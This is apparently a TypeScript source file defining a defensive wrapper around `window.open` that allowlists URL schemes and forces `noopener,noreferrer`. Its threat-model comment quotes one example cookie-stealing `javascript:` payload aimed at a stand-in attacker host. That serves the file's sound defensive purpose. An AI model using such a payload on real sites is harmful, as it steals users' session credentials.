/**
 * safeOpenExternal — a defence-in-depth wrapper around `window.open` for
 * opening external URLs in a new browser tab.
 *
 * ## Threat model
 *
 * Without this wrapper a caller can accidentally (or via injected data) pass a
 * `javascript:` URI to `window.open`, causing arbitrary script execution in the
 * context of the current page.  A crafted URL such as
 * `javascript:fetch('https://attacker.example/steal?c='+document.cookie)` would
 * exfiltrate session credentials silently.  The window.open API also does not
 * enforce `noopener` by default in all browsers / call-sites, leaving the
 * opened tab with a `window.opener` reference that it can use to navigate the
 * parent page (reverse tabnapping).
 *
 * This wrapper closes both gaps:
 *   1. **Protocol allowlist** – only `https:`, `http:`, and `mailto:` are
 *      accepted.  Any other scheme (including `javascript:`, `data:`,
 *      `vbscript:`) is rejected with a typed error before `window.open` is
 *      called.
 *   2. **Forced `noopener,noreferrer`** – the feature string always contains
 *      these tokens, matching the `rel` attributes already used on every `<a
 *      target="_blank">` in the codebase.
 *
 * ## Performance note
 * The sanitisation path is a single `URL` parse plus an allowlist lookup — O(1)
 * and negligible compared to the network round-trip that follows.  No
 * measurement overhead is needed.
 *
 * @module safeOpenExternal
 */

/** Schemes that are permitted to be opened in a new tab. */
const ALLOWED_PROTOCOLS = new Set(['https:', 'http:', 'mailto:'])

/**
 * Discriminated-union result type.
 *
 * On success the `WindowProxy | null` value returned by `window.open` is
 * surfaced so callers can interact with the new tab (e.g. focus it).  On
 * failure a typed `SafeOpenError` is returned — the function never throws so
 * callers do not need a try/catch.
 */
export type SafeOpenResult =
  | { ok: true; handle: WindowProxy | null }
  | { ok: false; error: SafeOpenError }

/**
 * Typed error describing why a URL was rejected.
 *
 * - `'blocked_protocol'` — the URL uses a scheme that is not on the allowlist
 *   (e.g. `javascript:`, `data:`).
 * - `'invalid_url'` — the string could not be parsed as a URL at all.
 */
export type SafeOpenError =
  | { kind: 'blocked_protocol'; url: string; protocol: string }
  | { kind: 'invalid_url'; url: string }

/**
 * Safely opens `url` in a new browser tab.
 *
 * The URL is parsed and its protocol is checked against an allowlist before
 * `window.open` is called.  The window is always opened with
 * `noopener,noreferrer` to prevent reverse tabnapping regardless of what the
 * caller supplies in `features`.
 *
 * @param url     The URL to open.  Must use `https:`, `http:`, or `mailto:`.
 * @param features Optional `window.open` feature string.  The tokens
 *                 `noopener` and `noreferrer` are injected automatically;
 *                 there is no need to include them manually.
 * @returns A `SafeOpenResult` — check `.ok` before using `.handle`.
 *
 * @example
 * ```ts
 * const result = safeOpenExternal('https://stellar.expert/explorer/public/tx/abc')
 * if (!result.ok) {
 *   console.error('Blocked:', result.error)
 * }
 * ```
 */
export function safeOpenExternal(url: string, features?: string): SafeOpenResult {
  // 1. Parse — reject anything that is not a valid URL string.
  let parsed: URL
  try {
    parsed = new URL(url)
  } catch {
    return { ok: false, error: { kind: 'invalid_url', url } }
  }

  // 2. Protocol allowlist — block javascript:, data:, vbscript:, etc.
  if (!ALLOWED_PROTOCOLS.has(parsed.protocol)) {
    return {
      ok: false,
      error: { kind: 'blocked_protocol', url, protocol: parsed.protocol },
    }
  }

  // 3. Build the feature string, always injecting noopener and noreferrer.
  const baseFeatures = features ? features.split(',').map((f) => f.trim()) : []
  const securityTokens = ['noopener', 'noreferrer']
  const mergedFeatures = [
    ...baseFeatures.filter(
      (f) => !securityTokens.includes(f.toLowerCase()),
    ),
    ...securityTokens,
  ].join(',')

  // 4. Open the window.
  const handle = window.open(url, '_blank', mergedFeatures)
  return { ok: true, handle }
}
